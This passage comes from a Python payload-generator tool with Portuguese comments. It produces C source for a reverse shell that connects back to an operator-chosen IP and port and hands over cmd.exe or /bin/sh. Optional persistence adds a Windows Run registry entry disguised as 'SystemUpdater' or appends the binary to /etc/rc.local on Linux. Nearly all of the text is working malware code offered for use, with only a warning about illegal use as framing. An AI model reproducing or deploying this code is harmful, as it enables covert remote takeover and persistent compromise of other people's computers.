    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegOpenKeyEx(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);
    
    RegSetValueEx(hKey, "SystemUpdater", 0, REG_SZ, 
        (BYTE*)path, strlen(path)+1);
    
    RegCloseKey(hKey);
}
#endif

// Código de persistência para Linux
#ifdef __linux__
void add_to_startup() {
    char path[1024];
    readlink("/proc/self/exe", path, sizeof(path));
    
    FILE *f = fopen("/etc/rc.local", "a");
    if(f) {
        fprintf(f, "%s &\n", path);
        fclose(f);
    }
}
#endif
""" if persistente else ""

        main_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Para Windows
#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define close closesocket
#define sleep(x) Sleep(x*1000)
#else
// Para Unix/Linux
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

void reverse_shell(const char *ip, int port) {{
    #ifdef _WIN32
    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0) {{
        return;
    }}
    #endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {{
        return;
    }}

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    struct hostent *host = gethostbyname(ip);
    if(host == NULL) {{
        close(sock);
        return;
    }}
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);

    // Tentar reconectar periodicamente
    while(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {{
        sleep(5);
    }}

    // Redirecionar stdin, stdout, stderr para o socket
    #ifdef _WIN32
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    #else
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execl("/bin/sh", "sh", NULL);
    #endif

    close(sock);
}}

int main() {{
    {persistence_code if persistente else ""}
    {"add_to_startup();" if persistente else ""}
    
    // Executar em uma thread separada para evitar bloqueio
    #ifdef _WIN32
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)reverse_shell, 
        (LPVOID)"{ip}", 0, NULL);
    #else
    if(fork() == 0) {{
        reverse_shell("{ip}", {porta});
        exit(0);
    }}
    #endif
    
    // Manter o processo principal vivo
    while(1) {{
        #ifdef _WIN32
        Sleep(10000);
        #else
        sleep(10);
        #endif
    }}
    
    return 0;
}}
"""
        return main_code
    
    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL PODE RESULTAR EM PRISÃO! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsCElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro fatal: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
